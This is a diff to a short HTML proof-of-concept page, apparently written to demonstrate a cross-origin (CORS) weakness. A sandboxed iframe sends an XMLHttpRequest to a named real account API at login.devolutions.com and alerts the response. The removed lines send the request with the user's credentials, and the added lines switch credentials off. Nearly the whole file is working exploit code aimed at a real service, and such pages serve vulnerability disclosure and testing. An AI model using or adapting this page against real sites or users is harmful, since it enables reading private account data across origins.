@@ -1,16 +1,16 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <iframe sandbox="allow-scripts allow-forms" srcdoc="
-      <script>
-        var req = new XMLHttpRequest();
-        req.onload = function() {
-          alert('Response from vulnerable API:\\n\\n' + this.responseText);
-        };
-        req.open('GET', 'https://login.devolutions.com/api/v1/account', true);
-        req.withCredentials = true;
-        req.send();
-      <\/script>
-    "></iframe>
+  <iframe sandbox="allow-scripts allow-forms" srcdoc="
+  <script>
+    var req = new XMLHttpRequest();
+    req.onload = function() {
+      alert('Response from vulnerable API:\\n\\n' + this.responseText);
+    };
+    req.open('GET', 'https://login.devolutions.com/api/v1/account', true);
+    req.withCredentials = false; // No cookies required
+    req.send();
+  <\/script>
+"></iframe>
   </body>
 </html>
